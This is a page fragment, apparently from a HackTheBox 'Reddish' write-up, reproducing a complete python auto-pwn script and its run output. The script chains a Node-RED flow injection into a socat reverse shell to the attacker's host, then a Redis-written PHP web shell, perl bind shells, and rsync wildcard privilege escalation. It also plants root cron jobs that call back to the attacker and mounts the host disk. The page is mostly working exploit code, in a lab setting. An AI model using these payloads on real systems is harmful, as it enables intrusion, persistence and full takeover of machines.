<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb58.jpg"></li>
</ul>
<h2 id="python-auto-pwn-script"><a href="#python-auto-pwn-script" class="headerlink" title="python auto-pwn script"></a>python auto-pwn script</h2><p>reference to <span class="exturl" data-url="aHR0cHM6Ly9hbGFtb3QuZ2l0aHViLmlvL3JlZGRpc2hfd3JpdGV1cC8=">this writeup link<i class="fa fa-external-link-alt"></i></span></p>
<p>awesome write up and python script, i Worship the author…</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsYW1vdC9jb2RlLXNuaXBwZXRzL2Jsb2IvbWFzdGVyL2hhY2tpbmcvSFRCL1JlZGRpc2gvYXV0b3B3bl9yZWRkaXNoLnB5">script in his github<i class="fa fa-external-link-alt"></i></span></p>
<p>autopwnreddish.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import uuid</span><br><span class="line">import fcntl</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_ip_address(ifname):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="built_in">return</span> socket.inet_ntoa(fcntl.ioctl(</span><br><span class="line">        s.fileno(),</span><br><span class="line">        0x8915,  <span class="comment"># SIOCGIFADDR</span></span><br><span class="line">        struct.pack(<span class="string">&#x27;256s&#x27;</span>, ifname[:15].encode())</span><br><span class="line">    )[20:24])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">LHOST = get_ip_address(<span class="string">&#x27;tun0&#x27;</span>)</span><br><span class="line">LPORT1 = <span class="string">&quot;60000&quot;</span></span><br><span class="line">LPORT2 = str(random.randint(60003, 62535))</span><br><span class="line">LPORT3 = str(random.randint(62535, 65535))</span><br><span class="line">LPORT4 = <span class="string">&quot;60001&quot;</span></span><br><span class="line">UUIDNAME = str(uuid.uuid4())[:8]</span><br><span class="line">SOCAT_SRCPATH = <span class="string">&quot;socat&quot;</span></span><br><span class="line">SOCAT_DSTPATH = <span class="string">&quot;/var/tmp/socat&quot;</span> + UUIDNAME</span><br><span class="line">SUBASH_PATH = <span class="string">&quot;/var/tmp/&quot;</span> + UUIDNAME</span><br><span class="line">CRONPL_PATH = <span class="string">&quot;/tmp/&quot;</span> + UUIDNAME</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_payloads():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Get id</span></span><br><span class="line">    p1 = log.progress(<span class="string">&quot;Getting our id&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en&quot;</span>,<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p1.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            uid = json_data = json.loads(response.text)[<span class="string">&quot;id&quot;</span>].strip()</span><br><span class="line">            p1.success(<span class="string">&quot;OK (id = &quot;</span> + uid + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p1.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Load flows</span></span><br><span class="line">    p2 = log.progress(<span class="string">&quot;Loading node-red flows&quot;</span>)</span><br><span class="line">    with open(SOCAT_SRCPATH, <span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line">        b64upload = base64.b64encode(f.read())</span><br><span class="line">    rawBody = <span class="string">&quot;&#123;\&quot;flows\&quot;:[&#123;\&quot;id\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;type\&quot;:\&quot;tab\&quot;,\&quot;label\&quot;:\&quot;Flow 1\&quot;&#125;,&#123;\&quot;id\&quot;:\&quot;6c08c84b.d9c578\&quot;,\&quot;type\&quot;:\&quot;inject\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;topic\&quot;:\&quot;\&quot;,\&quot;payload\&quot;:\&quot;node -e &#x27;(function()&#123; var  cp = require(\\\&quot;child_process\\\&quot;), sh = cp.spawn(\\\&quot;/bin/sh\\\&quot;, [\\\&quot;-c\\\&quot;, \\\&quot;cat &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot;.b64 | base64 -d &gt; &quot;</span> +SOCAT_DSTPATH + <span class="string">&quot; &amp;&amp; chmod +x &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; &amp;&amp; &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; exec:/bin/bash,pty,rawer,echo=0,stderr,setsid,sigint tcp:&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> + LPORT1 + <span class="string">&quot;\\\&quot;]); return /a/; &#125;)();&#x27;\&quot;,\&quot;payloadType\&quot;:\&quot;str\&quot;,\&quot;repeat\&quot;:\&quot;\&quot;,\&quot;crontab\&quot;:\&quot;\&quot;,\&quot;once\&quot;:false,\&quot;onceDelay\&quot;:0.1,\&quot;x\&quot;:151,\&quot;y\&quot;:88,\&quot;wires\&quot;:[[\&quot;d27da06a.44a1a\&quot;]]&#125;,&#123;\&quot;id\&quot;:\&quot;d27da06a.44a1a\&quot;,\&quot;type\&quot;:\&quot;exec\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;command\&quot;:\&quot;\&quot;,\&quot;addpay\&quot;:true,\&quot;append\&quot;:\&quot;\&quot;,\&quot;useSpawn\&quot;:\&quot;false\&quot;,\&quot;timer\&quot;:\&quot;\&quot;,\&quot;oldrc\&quot;:false,\&quot;name\&quot;:\&quot;\&quot;,\&quot;x\&quot;:310,\&quot;y\&quot;:80,\&quot;wires\&quot;:[[],[],[]]&#125;,&#123;\&quot;id\&quot;:\&quot;fae51292.d8e68\&quot;,\&quot;type\&quot;:\&quot;inject\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;topic\&quot;:\&quot;\&quot;,\&quot;payload\&quot;:\&quot;&quot;</span> + b64upload +<span class="string">&quot;\&quot;,\&quot;payloadType\&quot;:\&quot;str\&quot;,\&quot;repeat\&quot;:\&quot;\&quot;,\&quot;crontab\&quot;:\&quot;\&quot;,\&quot;once\&quot;:false,\&quot;onceDelay\&quot;:0.1,\&quot;x\&quot;:113,\&quot;y\&quot;:260,\&quot;wires\&quot;:[[\&quot;7e1e7cb5.664234\&quot;]]&#125;,&#123;\&quot;id\&quot;:\&quot;7e1e7cb5.664234\&quot;,\&quot;type\&quot;:\&quot;file\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;filename\&quot;:\&quot;&quot;</span> + SOCAT_DSTPATH +<span class="string">&quot;.b64\&quot;,\&quot;appendNewline\&quot;:false,\&quot;createDir\&quot;:false,\&quot;overwriteFile\&quot;:\&quot;true\&quot;,\&quot;x\&quot;:320,\&quot;y\&quot;:260,\&quot;wires\&quot;:[]&#125;]&#125;&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/flows&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json; charset=utf-8&quot;</span>,<span class="string">&quot;Node-RED-Deployment-Type&quot;</span>:<span class="string">&quot;full&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/flows&quot;</span>, data=rawBody, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p2.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p2.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p2.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject base64-encoded socat</span></span><br><span class="line">    p3 = log.progress(<span class="string">&quot;Injecting base64-encoded socat&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/inject/fae51292.d8e68&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/inject/fae51292.d8e68&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p3.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p3.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p3.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject nodejs reverse shell</span></span><br><span class="line">    p4 = log.progress(<span class="string">&quot;Injecting socat reverse shell via nodejs [&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> + str(LPORT1) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span> + uid + <span class="string">&quot;/inject/6c08c84b.d9c578&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span> + uid + <span class="string">&quot;/inject/6c08c84b.d9c578&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p4.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p4.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p4.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;What shell do you want?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[1] root@nodered&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[2] www-data@www&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[3] root@www&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[4] root@backup&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[5] root@reddish&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[6] Exit&quot;</span>)</span><br><span class="line">response = None</span><br><span class="line"><span class="keyword">while</span> response not <span class="keyword">in</span> [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>]:</span><br><span class="line">    response = raw_input(<span class="string">&quot;Please enter a number 1-6: &quot;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;6&quot;</span>:</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    threading.Thread(target=send_payloads).start()</span><br><span class="line">except Exception as e:</span><br><span class="line">    log.error(str(e))</span><br><span class="line">socat = listen(LPORT1, bindaddr=LHOST, timeout=20).wait_for_connection()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Uploading &quot;</span> + UUIDNAME + <span class="string">&quot;.php on the www container via redis&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;*1\\r\\n<span class="variable">$8</span>\\r\\nFLUSHALL\\r\\n*3\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$1</span>\\r\\n1\\r\\n<span class="variable">$45</span>\\r\\n&lt;?php echo shell_exec(<span class="variable">$_GET</span>[\&quot;e\&quot;].\&quot; 2&gt;&amp;1\&quot;); ?&gt;\\r\\n*4\\r\\n<span class="variable">$6</span>\\r\\nCONFIG\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$10</span>\\r\\ndbfilename\\r\\n<span class="variable">$12</span>\\r\\n&quot;</span> + UUIDNAME +  <span class="string">&quot;.php\\r\\n*4\\r\\n<span class="variable">$6</span>\\r\\nCONFIG\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$3</span>\\r\\ndir\\r\\n<span class="variable">$46</span>\\r\\n/var/www/html/8924d0549008565c554f8128cd11fda4\\r\\n*1\\r\\n<span class="variable">$4</span>\\r\\nSAVE\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:redis:6379&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;GET /8924d0549008565c554f8128cd11fda4/&quot;</span> + UUIDNAME+ <span class="string">&quot;.php?e=<span class="subst">$(whoami)</span>@<span class="subst">$(hostname)</span>END HTTP/1.1\\r\\nHost: nodered\\r\\nUser-agent: curl\\r\\n\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:www:80&quot;</span>)</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;www-data@www&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;www-data@www&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK (user = www-data@www)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending perl bind shell [www-data@www:&quot;</span> + str(LPORT2) + <span class="string">&quot;] via &quot;</span> + UUIDNAME + <span class="string">&quot;.php &amp; trying to connect&quot;</span>) as p:</span><br><span class="line">    perl_payload = <span class="string">&quot;perl -e &#x27;use Socket;<span class="variable">$p</span>=&quot;</span> + str(LPORT2) +<span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));bind(S,sockaddr_in(<span class="variable">$p</span>, INADDR_ANY));listen(S,SOMAXCONN);for(;<span class="variable">$p</span>=accept(C,S);close C)&#123;open(STDIN,\&quot;&gt;&amp;C\&quot;);open(STDOUT,\&quot;&gt;&amp;C\&quot;);open(STDERR,\&quot;&gt;&amp;C\&quot;);exec(\&quot;/bin/bash -i\&quot;);&#125;;&#x27;&quot;</span></span><br><span class="line">    urled_perl_payload = urllib.quote_plus(perl_payload)</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;GET /8924d0549008565c554f8128cd11fda4/&quot;</span> + UUIDNAME + <span class="string">&quot;.php?e=&quot;</span> + urled_perl_payload + <span class="string">&quot; HTTP/1.1\\r\\nHost: nodered\\r\\nUser-Agent: curl\\r\\n\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:www:80&quot;</span>)</span><br><span class="line">    socat.sendline(SOCAT_DSTPATH + <span class="string">&quot; file:`tty`,echo=0,rawer TCP:www:&quot;</span> + str(LPORT2))</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;shell&quot;</span>, timeout=20)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;shell&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    socat.sendline(<span class="string">&quot;script --return -c &#x27;/bin/bash -i&#x27; /dev/null&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;stty raw -echo&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Exploiting wildcards for privesc. Wait at most 180 secs for rsync backup job to run&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&#x27;echo &quot;/bin/cp /bin/bash &#x27;</span> + SUBASH_PATH + <span class="string">&#x27;;/bin/chmod 4755 &#x27;</span> + SUBASH_PATH + <span class="string">&#x27;&quot; &gt; &quot;/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/&#x27;</span> + UUIDNAME + <span class="string">&#x27;.rdb&quot;&#x27;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&#x27;touch &quot;/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e sh &#x27;</span> + UUIDNAME + <span class="string">&#x27;.rdb&quot;&#x27;</span>)</span><br><span class="line">    count = 0</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        p.status(str(count))</span><br><span class="line">        sleep(1)</span><br><span class="line">        socat.sendline(<span class="string">&quot;[ -f &quot;</span> + SUBASH_PATH + <span class="string">&quot; ] &amp;&amp; echo &#x27;OK&#x27; || echo &#x27;NO&#x27;&quot;</span>)</span><br><span class="line">        socat.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">        output = socat.recv(3).strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;OK&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">            p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        count += 1</span><br><span class="line">        <span class="keyword">if</span> count &gt; 180:</span><br><span class="line">            p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">    socat.sendline(SUBASH_PATH + <span class="string">&#x27; -i -p&#x27;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;cd /root&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending a cronjob for bind shell [root@backup:&quot;</span> +str(LPORT3)+ <span class="string">&quot;]. Please wait&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;use Socket;<span class="variable">$p</span>=&quot;</span> + str(LPORT3) + <span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));bind(S,sockaddr_in(<span class="variable">$p</span>, INADDR_ANY));listen(S,SOMAXCONN);for(;<span class="variable">$p</span>=accept(C,S);close C)&#123;open(STDIN,\&quot;&gt;&amp;C\&quot;);open(STDOUT,\&quot;&gt;&amp;C\&quot;);open(STDERR,\&quot;&gt;&amp;C\&quot;);exec(\&quot;/bin/bash -i\&quot;);&#125;;&#x27; &gt; &quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;* * * * * root /usr/bin/perl &quot;</span> + CRONPL_PATH +  <span class="string">&quot;.pl&#x27; &gt; &quot;</span> + CRONPL_PATH + <span class="string">&quot;cronjob&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;rsync -a &quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl backup::src&quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;rsync -a &quot;</span> + CRONPL_PATH + <span class="string">&quot;cronjob backup::src/etc/cron.d/&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(62):</span><br><span class="line">        p.status(str(61 - i))</span><br><span class="line">        time.sleep(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;perl -MFcntl=F_SETFL,F_GETFL,O_NONBLOCK -MSocket &#x27;-e<span class="variable">$0</span>=perl;socket(<span class="variable">$c</span>,AF_INET,SOCK_STREAM,0)&amp;&amp;connect(<span class="variable">$c</span>,pack_sockaddr_in(&quot;</span>+ str(LPORT3) + <span class="string">&quot;,inet_aton(\&quot;backup\&quot;)))||die$!;fcntl<span class="variable">$_</span>,F_SETFL,O_NONBLOCK|fcntl<span class="variable">$_</span>,F_GETFL,0 for@d=(*STDIN,<span class="variable">$c</span>),@e=(<span class="variable">$c</span>,*STDOUT);L:for(0,1)&#123;sysread(<span class="variable">$d</span>[<span class="variable">$_</span>],<span class="variable">$f</span>,8**5)||exit and<span class="variable">$f</span>[<span class="variable">$_</span>].=<span class="variable">$f</span> if vec<span class="variable">$g</span>,<span class="variable">$_</span>*(<span class="variable">$h</span>=fileno<span class="variable">$c</span>),1;substr<span class="variable">$f</span>[<span class="variable">$_</span>],0,syswrite(<span class="variable">$e</span>[<span class="variable">$_</span>],<span class="variable">$f</span>[<span class="variable">$_</span>],8**5),\&quot;\&quot;;vec(<span class="variable">$g</span>,<span class="variable">$_</span>*<span class="variable">$h</span>,1)=(<span class="variable">$i</span>=length<span class="variable">$f</span>[<span class="variable">$_</span>]&lt;8**5);vec(<span class="variable">$j</span>,<span class="variable">$_</span>||<span class="variable">$h</span>,1)=!!<span class="variable">$i</span>&#125;select<span class="variable">$g</span>,<span class="variable">$j</span>,<span class="variable">$k</span>,5;goto L&#x27;&quot;</span>)</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;shell&quot;</span>, timeout=20)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;shell&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    socat.sendline(<span class="string">&quot;script --return -c &#x27;/bin/bash -i&#x27; /dev/null&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;stty raw -echo&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending reverse shell cronjob [&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> +str(LPORT4)+ <span class="string">&quot;] for root@host. Please wait&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;mkdir /mnt/sda1&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;mount /dev/sda1 /mnt/sda1&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;cat /mnt/sda1/root/root.txt&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&quot;</span> + LHOST + <span class="string">&quot;\&quot;,&quot;</span> + str(LPORT4) + <span class="string">&quot;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\&quot;HISTFILE\&quot;,\&quot;/dev/null\&quot;);pty.spawn([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);s.close();exit();&#x27; &gt; /mnt/sda1/tmp/&quot;</span> + UUIDNAME + <span class="string">&quot;.py&quot;</span>) </span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;* * * * * root /usr/bin/python /tmp/&quot;</span> + UUIDNAME + <span class="string">&quot;.py&#x27; &gt; /mnt/sda1/etc/cron.d/&quot;</span> + UUIDNAME + <span class="string">&quot;cronjob&quot;</span>)</span><br><span class="line">    host_shell = listen(LPORT4, bindaddr=LHOST, timeout=65).wait_for_connection()</span><br><span class="line">    <span class="keyword">if</span> host_shell.sock is None:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    host_shell.interactive()</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>

<p>effect as below:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python autopwnreddish.py </span></span><br><span class="line">What shell <span class="keyword">do</span> you want?</span><br><span class="line">[1] root@nodered</span><br><span class="line">[2] www-data@www</span><br><span class="line">[3] root@www</span><br><span class="line">[4] root@backup</span><br><span class="line">[5] root@reddish</span><br><span class="line">[6] Exit</span><br><span class="line">Please enter a number 1-6: 1</span><br><span class="line">[+] Getting our id: OK (id = c507228abb96d45d0541fd5eacebd9dd)</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60000: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60000: Got connection from 10.10.10.94 on port 36186</span><br><span class="line">[+] Loading node-red flows: OK</span><br><span class="line">[+] Injecting base64-encoded socat: OK</span><br><span class="line">[+] Injecting socat reverse shell via nodejs [10.10.14.9:60000]: OK</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ whoami</span></span><br><span class="line">root</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ cd ~</span></span><br><span class="line">root@nodered:~<span class="comment"># $ ls</span></span><br><span class="line">root@nodered:~<span class="comment"># $ exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">$ <span class="built_in">exit</span></span><br><span 